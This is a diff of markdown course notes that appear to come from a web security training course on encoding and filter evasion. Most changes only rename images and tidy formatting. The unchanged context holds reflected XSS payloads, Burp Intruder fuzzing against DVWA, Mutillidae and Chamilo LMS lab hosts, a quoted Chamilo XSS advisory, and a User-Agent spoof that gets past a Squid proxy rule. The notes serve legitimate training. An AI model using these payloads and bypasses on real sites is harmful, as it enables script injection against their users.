@@ -11,20 +11,16 @@ This course will start off by introducing you to the practice of characterset en
 
 ### Course Topic Overview
 
-- Charset Encoding
-- HTML Encoding
-- URL Encoding
-- Base64 Encoding
+- Charset, HTML, URL and Base64 Encoding
 - Bypassing Client-Side Filters
 - Bypassing Server-Side Filters
-- Web Application Firewalls (WAF) and Proxies
-- Evading WAFs, Proxies and IDSs
+- Bypassing Browser Based Restrictions
 
 ### Prerequisites
 
 - Basic familiarity with HTTP/HTTPS
 - Basic familiarity with OWASP ZAP/Burp Suite
-- Basic familiarity with Javascript
+- Basic familiarity with JavaScript
 
 ### Learning Objectives
 
@@ -64,7 +60,7 @@ This course will start off by introducing you to the practice of characterset en
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-![Lab - Charset Encoding 1](./assets/encoding_filtering_and_evasion_basics_lab_1.png)
+![Lab - Charset Encoding 1](./assets/09_encoding_filtering_and_evasion_basics_lab_1.png)
 
 `vim ./charset_encoding.html`:
 ```html
@@ -81,7 +77,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - Charset Encoding 2](./assets/encoding_filtering_and_evasion_basics_lab_2.png)
+![Lab - Charset Encoding 2](./assets/09_encoding_filtering_and_evasion_basics_lab_2.png)
 
 ### HTML Encoding
 
@@ -105,7 +101,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - HTML Encoding 1](./assets/encoding_filtering_and_evasion_basics_lab_html_encoding_1.png)
+![Lab - HTML Encoding 1](./assets/09_encoding_filtering_and_evasion_basics_lab_html_encoding_1.png)
 
 `vim ./test2.html`:
 ```html
@@ -120,11 +116,11 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - HTML Encoding 2](./assets/encoding_filtering_and_evasion_basics_lab_html_encoding_2.png)
+![Lab - HTML Encoding 2](./assets/09_encoding_filtering_and_evasion_basics_lab_html_encoding_2.png)
 
 `CyberChef` > `https://cyberchef.org/#recipe=To_HTML_Entity(false,'Named%20entities')&input=VGhpcyBpcyBhIDxzY3JpcHQ%2BYWxlcnQoInNjcmlwdCIpOzwvc2NyaXB0PiA8c3Ryb25nPlRFU1Q8L3N0cm9uZz4`
 
-![Lab - HTML Encoding 3](./assets/encoding_filtering_and_evasion_basics_lab_html_encoding_3.png)
+![Lab - HTML Encoding 3](./assets/09_encoding_filtering_and_evasion_basics_lab_html_encoding_3.png)
 
 `sudo systemctl start apache2`
 
@@ -150,7 +146,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - HTML Encoding 4](./assets/encoding_filtering_and_evasion_basics_lab_html_encoding_4.png)
+![Lab - HTML Encoding 4](./assets/09_encoding_filtering_and_evasion_basics_lab_html_encoding_4.png)
 
 `vim ./html_encode_safe.php`:
 ```php
@@ -173,15 +169,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - HTML Encoding 5](./assets/encoding_filtering_and_evasion_basics_lab_html_encoding_5.png)
+![Lab - HTML Encoding 5](./assets/09_encoding_filtering_and_evasion_basics_lab_html_encoding_5.png)
 
 ### URL Encoding
 
 #### Lab Solution
 
-![Lab - URL Encoding 1](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_1.png)
+![Lab - URL Encoding 1](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_1.png)
 
-![Lab - URL Encoding 2](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_2.png)
+![Lab - URL Encoding 2](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_2.png)
 
 `python3 -m http.server 80`:
 ```
@@ -216,9 +212,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - URL Encoding 3](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_3.png)
+![Lab - URL Encoding 3](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_3.png)
 
-![Lab - URL Encoding 4](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_4.png)
+![Lab - URL Encoding 4](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_4.png)
 
 `sudo systemctl start apache2`
 
@@ -250,9 +246,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - URL Encoding 5](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_5.png)
+![Lab - URL Encoding 5](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_5.png)
 
-![Lab - URL Encoding 6](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_6.png)
+![Lab - URL Encoding 6](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_6.png)
 
 `vim ./url_encoding_decoding.php`:
 ```php
@@ -285,7 +281,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 `HTTP Request`:
 ```http
-GET /url_encoding_decoding.php?inputText=%3Cscript%3Ealert%28%22TEST%22%29%3B%3C%2Fscript%3E HTTP/1.1 📌
+GET /url_encoding_decoding.php?inputText=%3Cscript%3Ealert%28%22TEST%22%29%3B%3C%2Fscript%3E📌 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
@@ -301,7 +297,7 @@ Sec-Fetch-User: ?1
 Priority: u=0, i
 ```
 
-![Lab - URL Encoding 7](./assets/encoding_filtering_and_evasion_basics_lab_url_encoding_7.png)
+![Lab - URL Encoding 7](./assets/09_encoding_filtering_and_evasion_basics_lab_url_encoding_7.png)
 
 ### Base64 Encoding
 
@@ -341,7 +337,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </html>
 ```
 
-![Lab - Base64 Encoding 1](./assets/encoding_filtering_and_evasion_basics_lab_base64_encoding_1.png)
+![Lab - Base64 Encoding 1](./assets/09_encoding_filtering_and_evasion_basics_lab_base64_encoding_1.png)
 
 `echo -n 'TEST' | base64`:
 ```
@@ -379,7 +375,7 @@ CCAyzWaV4jkHxEy8DF6FFpYrOI3i6WcvhTEVnH4cbPNCTBooYK2HeBWCHZzSdFsUAEQCmS446uJTqFuE
 </html>
 ```
 
-![Lab - Base64 Encoding 2](./assets/encoding_filtering_and_evasion_basics_lab_base64_encoding_2.png)
+![Lab - Base64 Encoding 2](./assets/09_encoding_filtering_and_evasion_basics_lab_base64_encoding_2.png)
 
 ---
 
@@ -411,7 +407,7 @@ The following username and password may be used to explore the application:
 
 #### Lab Solution
 
-![Lab - Mutillidae II 1](./assets/encoding_filtering_and_evasion_basics_lab_multillidae_ii_1.png)
+![Lab - Mutillidae II 1](./assets/09_encoding_filtering_and_evasion_basics_lab_mutillidae_ii_1.png)
 
 `view-source:https://bjrjf35ikizrz2cggpk56tiff.eu-central-6.attackdefensecloudlabs.com/index.php?page=dns-lookup.php`:
 ```php
@@ -420,7 +416,7 @@ The following username and password may be used to explore the application:
 <!-- BEGIN HTML OUTPUT  -->
 <script type="text/javascript">
 	var onSubmitOfForm = function(/* HTMLForm */ theForm){
-		var lOSCommandInjectionPattern = /*/;var lCrossSiteScriptingPattern = /*/; 📌		
+		var lOSCommandInjectionPattern = /*/;var lCrossSiteScriptingPattern = /*/;📌
 		if(theForm.target_host.value.search(lOSCommandInjectionPattern) > -1){
 			alert("Ampersand and semi-colon are not allowed.\n\nDon\'t listen to security people. Everyone knows if we just filter dangerous characters, XSS is not possible.\n\nWe use JavaScript defenses combined with filtering technology.\n\nBoth are such great defenses that you are stopped in your tracks.");
 			return false;
@@ -435,8 +431,8 @@ The following username and password may be used to explore the application:
 
 [...]
 
-<form 	action="[index.php?page=dns-lookup.php](view-source:https://bjrjf35ikizrz2cggpk56tiff.eu-central-6.attackdefensecloudlabs.com/index.php?page=dns-lookup.php)" 📌 
-			method="post" 📌
+<form 	action="[index.php?page=dns-lookup.php](view-source:https://bjrjf35ikizrz2cggpk56tiff.eu-central-6.attackdefensecloudlabs.com/index.php?page=dns-lookup.php)"📌
+			method="post"📌
 			enctype="application/x-www-form-urlencoded" 
 			onsubmit="return onSubmitOfForm(this);"
 			id="idDNSLookupForm">
@@ -444,9 +440,9 @@ The following username and password may be used to explore the application:
 [...]
 ```
 
-![Lab - Mutillidae II 2](./assets/encoding_filtering_and_evasion_basics_lab_multillidae_ii_2.png)
+![Lab - Mutillidae II 2](./assets/09_encoding_filtering_and_evasion_basics_lab_mutillidae_ii_2.png)
 
-![Lab - Mutillidae II 3](./assets/encoding_filtering_and_evasion_basics_lab_multillidae_ii_3.png)
+![Lab - Mutillidae II 3](./assets/09_encoding_filtering_and_evasion_basics_lab_mutillidae_ii_3.png)
 
 `view-source:https://bjrjf35ikizrz2cggpk56tiff.eu-central-6.attackdefensecloudlabs.com/index.php?page=dns-lookup.php`:
 ```php
@@ -455,7 +451,7 @@ The following username and password may be used to explore the application:
 <!-- BEGIN HTML OUTPUT  -->
 <script type="text/javascript">
 	var onSubmitOfForm = function(/* HTMLForm */ theForm){
-		var lOSCommandInjectionPattern = /[;&]/;var lCrossSiteScriptingPattern = /[<>=()]/; 📌	
+		var lOSCommandInjectionPattern = /[;&]/;var lCrossSiteScriptingPattern = /[<>=()]/;📌
 		if(theForm.target_host.value.search(lOSCommandInjectionPattern) > -1){
 			alert("Ampersand and semi-colon are not allowed.\n\nDon\'t listen to security people. Everyone knows if we just filter dangerous characters, XSS is not possible.\n\nWe use JavaScript defenses combined with filtering technology.\n\nBoth are such great defenses that you are stopped in your tracks.");
 			return false;
@@ -492,12 +488,12 @@ The following username and password may be used to explore the application:
 				<input 	type="text" id="idTargetHostInput" name="target_host" size="20" 
 						autofocus="autofocus"
 						OSCommandInjectionPoint="1"
-						minlength="1" maxlength="20" 📌 required="required"				/>
+						minlength="1" maxlength="20"📌 required="required"				/>
 			</td>
 [...]
 ```
 
-![Lab - Mutillidae II 4](./assets/encoding_filtering_and_evasion_basics_lab_multillidae_ii_4.png)
+![Lab - Mutillidae II 4](./assets/09_encoding_filtering_and_evasion_basics_lab_mutillidae_ii_4.png)
 
 `burpsuite` > `Repeater`
 
@@ -523,10 +519,10 @@ Priority: u=0, i
 Te: trailers
 Connection: keep-alive
 
-target_host=<script>alert("TEST");</script>&dns-lookup-php-submit-button=Lookup+DNS 📌
+target_host=<script>alert("TEST");</script>&dns-lookup-php-submit-button=Lookup+DNS📌
 ```
 
-![Lab - Mutillidae II 5](./assets/encoding_filtering_and_evasion_basics_lab_multillidae_ii_5.png)
+![Lab - Mutillidae II 5](./assets/09_encoding_filtering_and_evasion_basics_lab_mutillidae_ii_5.png)
 
 ### Bypassing Server-Side Filters
 
@@ -551,17 +547,17 @@ The following username and password may be used to explore the application:
 
 #### Lab Solution
 
-![Lab - Damn Vulnerable Web Application 1](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_1.png)
+![Lab - Damn Vulnerable Web Application 1](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_1.png)
 
-![Lab - Damn Vulnerable Web Application 2](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_2.png)
+![Lab - Damn Vulnerable Web Application 2](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_2.png)
 
-![Lab - Damn Vulnerable Web Application 3](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_3.png)
+![Lab - Damn Vulnerable Web Application 3](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_3.png)
 
 `burpsuite` > `Intruder` > `Payloads` = `Payload configuration: Load: /home/kali/tools/SecLists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt/XSS-BruteLogic.txt` = `Payload encoding: URL-encode: enabled` > `Settings` = `Redirections: Always` > `Start attack`
 
 `HTTP Request`:
 ```http
-GET /vulnerabilities/xss_r/?name=§TESTING§ HTTP/2 📌
+GET /vulnerabilities/xss_r/?name=§TESTING§📌 HTTP/2
 Host: 40gn7w9m9kaqb4y1xxnjkfpi2.eu-central-6.attackdefensecloudlabs.com
 Cookie: PHPSESSID=c95thukdhdn9g15j21oho4jdj4; security=medium
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -579,7 +575,7 @@ Te: trailers
 ```
 `HTTP Request`:
 ```http
-GET /vulnerabilities/xss_r/?name=%3cImg%20Src%3djavascript%3aalert(1)%20OnError%3dlocation%3dsrc%3e HTTP/2 📌
+GET /vulnerabilities/xss_r/?name=%3cImg%20Src%3djavascript%3aalert(1)%20OnError%3dlocation%3dsrc%3e📌 HTTP/2
 Host: 40gn7w9m9kaqb4y1xxnjkfpi2.eu-central-6.attackdefensecloudlabs.com
 Cookie: PHPSESSID=c95thukdhdn9g15j21oho4jdj4; security=medium
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -607,17 +603,17 @@ Te: trailers
 <Img Src=javascript:alert(1) OnError=location=src>
 ```
 
-![Lab - Damn Vulnerable Web Application 4](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_4.png)
+![Lab - Damn Vulnerable Web Application 4](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_4.png)
 
-![Lab - Damn Vulnerable Web Application 5](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_5.png)
+![Lab - Damn Vulnerable Web Application 5](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_5.png)
 
-![Lab - Damn Vulnerable Web Application 6](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_6.png)
+![Lab - Damn Vulnerable Web Application 6](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_6.png)
 
-![Lab - Damn Vulnerable Web Application 7](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_7.png)
+![Lab - Damn Vulnerable Web Application 7](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_7.png)
 
-![Lab - Damn Vulnerable Web Application 8](./assets/encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_8.png)
+![Lab - Damn Vulnerable Web Application 8](./assets/09_encoding_filtering_and_evasion_basics_lab_damn_vulnerable_web_application_8.png)
 
-### Bypassing XSS Filters In Chamilo LMS
+### Bypassing XSS Filters in Chamilo LMS
 
 #### Lab Environment
 
@@ -633,7 +629,7 @@ In the exercise below, <u>the attacker is not authenticated to the web applica
 
 #### Lab Solution
 
-![Lab - Chamilo LMS 1](./assets/encoding_filtering_and_evasion_basics_lab_chamilo_lms_1.png)
+![Lab - Chamilo LMS 1](./assets/09_encoding_filtering_and_evasion_basics_lab_chamilo_lms_1.png)
 
 `searchsploit 'chamilo'`:
 ```
@@ -677,13 +673,13 @@ https://chamilo.org/chamilo-lms/
 
 IV. Vulnerability Details & Exploit
 ========================================================
-1) Multiple Reflected XSS Request 📌
+1) Multiple Reflected XSS Request📌
 
 Request Method = GET
 
 XSS PoC's:-
 
-/main/calendar/agenda_list.php?type=personal%27%20onmouseover=%27confirm%280%29%27/%3E%3C!-- 📌
+/main/calendar/agenda_list.php?type=personal%27%20onmouseover=%27confirm%280%29%27/%3E%3C!--📌
 /main/messages/outbox.php?f=social"+onmouseover="confirm(0)
 /main/mySpace/student.php?keyword=31337"+onmouseover=confirm(0)//&active=0&_qf__search_user=&submit=Search
 /main/inc/lib/fckeditor/editor/plugins/ajaxfilemanager/ajax_get_file_listing.php?editor=stand_alone&view=thumbnail&search=1&search_name=admin&search_recursively=0&search_mtime_from=&search_mtime_to=&search_folder=;</script><script>confirm(0)</script>
@@ -691,9 +687,9 @@ XSS PoC's:-
 /main/admin/course_category.php?action=add&category="/><script>confirm(0)</script>
 /main/admin/session_edit.php?page=resume_session.php%22%20onmouseover=confirm%280%29//&id=1
 
-b) User Agent Header XSS (Reflected) 📌
-GET /main/admin/system_status.php?section=webserver 📌
-User-Agent: <script>confirm(0)</script> 📌
+b) User Agent Header XSS (Reflected)📌
+GET /main/admin/system_status.php?section=webserver📌
+User-Agent: <script>confirm(0)</script>📌
 __________________________________________________________
 
 
@@ -702,19 +698,19 @@ __________________________________________________________
 VI. Affected Systems
 ========================================================
 Software: Chamilo LMS
-Version: 1.9.10 and Prior`📌
+Version: 1.9.10 and Prior📌
 Solution (Fix): Upgrade to 1.9.11 (https://github.com/chamilo/chamilo-lms/)
 
 [...] 
 ```
 
-![Lab - Chamilo LMS 2](./assets/encoding_filtering_and_evasion_basics_lab_chamilo_lms_2.png)
+![Lab - Chamilo LMS 2](./assets/09_encoding_filtering_and_evasion_basics_lab_chamilo_lms_2.png)
 
 `burpsuite` > `Intruder` > `Payloads` = `Payload configuration: Load: /home/kali/tools/SecLists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt/XSS-BruteLogic.txt` = `Payload encoding: URL-encode: enabled` > `Settings` = `Redirections: Always` > `Start attack`
 
 `HTTP Request`:
 ```http
- GET /main/calendar/agenda_list.php?type=personal§TESTING§ HTTP/2
+ GET /main/calendar/agenda_list.php?type=personal§TESTING§📌 HTTP/2
 Host: e9rkq8lenrm2q6cbn09m2173h.eu-central-6.attackdefensecloudlabs.com
 Cookie: ch_sid=t6d0u4jtrungkuui4jnqr32445; TestCookie=cookies_yes
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -729,12 +725,13 @@ Sec-Fetch-User: ?1
 Priority: u=0, i
 Te: trailers
 ```
+❌
 
 `burpsuite` > `Intruder` > `Payloads` = `Payload configuration: Load: /home/kali/tools/SecLists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt/XSS-BruteLogic.txt` = `Payload processing: Add prefix: ' ` = `Payload encoding: URL-encode: enabled` > `Settings` = `Redirections: Always` > `Start attack`
 
 `HTTP Request`:
 ```http
- GET /main/calendar/agenda_list.php?type=personal§TESTING§ HTTP/2
+ GET /main/calendar/agenda_list.php?type=personal§TESTING§📌 HTTP/2
 Host: e9rkq8lenrm2q6cbn09m2173h.eu-central-6.attackdefensecloudlabs.com
 Cookie: ch_sid=t6d0u4jtrungkuui4jnqr32445; TestCookie=cookies_yes
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -751,7 +748,7 @@ Te: trailers
 ```
 `HTTP Request`:
 ```http
-GET /main/calendar/agenda_list.php?type=personal'%20%22%3e%3csvg%20onload%3dalert(1)%2f%2f-- HTTP/2 📌
+GET /main/calendar/agenda_list.php?type=personal'%20%22%3e%3csvg%20onload%3dalert(1)%2f%2f--📌 HTTP/2
 Host: e9rkq8lenrm2q6cbn09m2173h.eu-central-6.attackdefensecloudlabs.com
 Cookie: ch_sid=t6d0u4jtrungkuui4jnqr32445; TestCookie=cookies_yes
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -768,16 +765,16 @@ Te: trailers
 Connection: keep-alive
 ```
 
-![Lab - Chamilo LMS 3](./assets/encoding_filtering_and_evasion_basics_lab_chamilo_lms_3.png)
+![Lab - Chamilo LMS 3](./assets/09_encoding_filtering_and_evasion_basics_lab_chamilo_lms_3.png)
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-GET /main/admin/system_status.php?section=webserver HTTP/2 📌
+GET /main/admin/system_status.php?section=webserver📌 HTTP/2
 Host: e9rkq8lenrm2q6cbn09m2173h.eu-central-6.attackdefensecloudlabs.com
 Cookie: ch_sid=t6d0u4jtrungkuui4jnqr32445; TestCookie=cookies_yes
-User-Agent: <script>confirm(0)</script> 📌
+User-Agent: <script>confirm(0)</script>📌
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
@@ -794,7 +791,7 @@ Te: trailers
 
 ## Evasion
 
-### Bypassing Squid Proxy - Browser Based Restrictions
+### Bypassing Browser Based Restrictions
 
 #### Lab Environment
 
@@ -802,7 +799,7 @@ Te: trailers
 
 [Squid](http://www.squid-cache.org/) is a caching web proxy. <u>The target machine as described below is running squid proxy. The proxy is configured only to serve requests coming from a specific web browser (i.e. Firefox). A web portal is running on the target machine. This portal is reachable only via the proxy</u>.
 
-**Objective**: You have to figure out a way to access the web portal and retrieve the flag!
+**Objective**: You have to figure out a way to access the web portal and retrieve the flag.
 
 Instructions: 
 - This lab is dedicated to you! No other users are on this network :)
@@ -817,7 +814,7 @@ Instructions: 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.122.81.2 📌 netmask 255.255.255.0  broadcast 192.122.81.255
+        inet 192.122.81.2📌 netmask 255.255.255.0  broadcast 192.122.81.255
         ether 02:42:c0:7a:51:02  txqueuelen 0  (Ethernet)
         RX packets 16  bytes 1376 (1.3 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -832,7 +829,7 @@ Nmap scan report for target-1 (192.122.81.3)
 Host is up (0.000024s latency).
 Not shown: 65534 closed ports
 PORT     STATE SERVICE    VERSION
-3128/tcp open  http-proxy Squid http proxy 3.5.12 📌
+3128/tcp open  http-proxy Squid http proxy 3.5.12📌
 MAC Address: 02:42:C0:7A:51:03 (Unknown)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -868,7 +865,7 @@ body
 :lang(fa) { direction: rtl; font-size: 100%; font-family: Tahoma, Roya, sans-serif; float: right; }
 :lang(he) { direction: rtl; }
  --></style>
-</head><body id=ERR_ACCESS_DENIED> 📌
+</head><body id=ERR_ACCESS_DENIED>📌
 <div id="titles">
 <h1>ERROR</h1>
 <h2>The requested URL could not be retrieved</h2>
@@ -876,13 +873,13 @@ body
 <hr>
 
 <div id="content">
-<p>The following error was encountered while trying to retrieve the URL: <a href="http://127.0.0.1/">http://127.0.0.1/</a></p> 📌
+<p>The following error was encountered while trying to retrieve the URL: <a href="http://127.0.0.1/">http://127.0.0.1/</a></p>📌
 
 <blockquote id="error">
 <p><b>Access Denied.</b></p>
 </blockquote>
 
-<p>Access control configuration prevents your request from being allowed at this time. Please contact your service provider if you feel this is incorrect.</p> 📌
+<p>Access control configuration prevents your request from being allowed at this time. Please contact your service provider if you feel this is incorrect.</p>📌
 
 <p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_ACCESS_DENIED&amp;body=CacheHost%3A%20victim-1%0D%0AErrPage%3A%20ERR_ACCESS_DENIED%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Sat,%2030%20Nov%202024%2017%3A38%3A12%20GMT%0D%0A%0D%0AClientIP%3A%20192.122.81.2%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.64.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20127.0.0.1%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>
 <br>
@@ -899,12 +896,13 @@ body
 
 `curl -H 'User-Agent: Firefox' -x 192.122.81.3:3128 127.0.0.1:80`:
 ```
-Congragulations you've successfully completed the challenge, here is your flag: 2F51D6A3271E1F892044DE948CFFC497
+Congragulations you've successfully completed the challenge, here is your flag: 2F51D6A3271E1F892044DE948CFFC497🚩
 ```
 
 ---
+---
 
-## References and Resources
+## Resources and References
 
 - [ASCII Table - Reference to ASCII Table of Windows-1252](https://www.ascii-code.com/)
 - [UTF-8 encoding table and Unicode characters](https://www.utf8-chartable.de/)
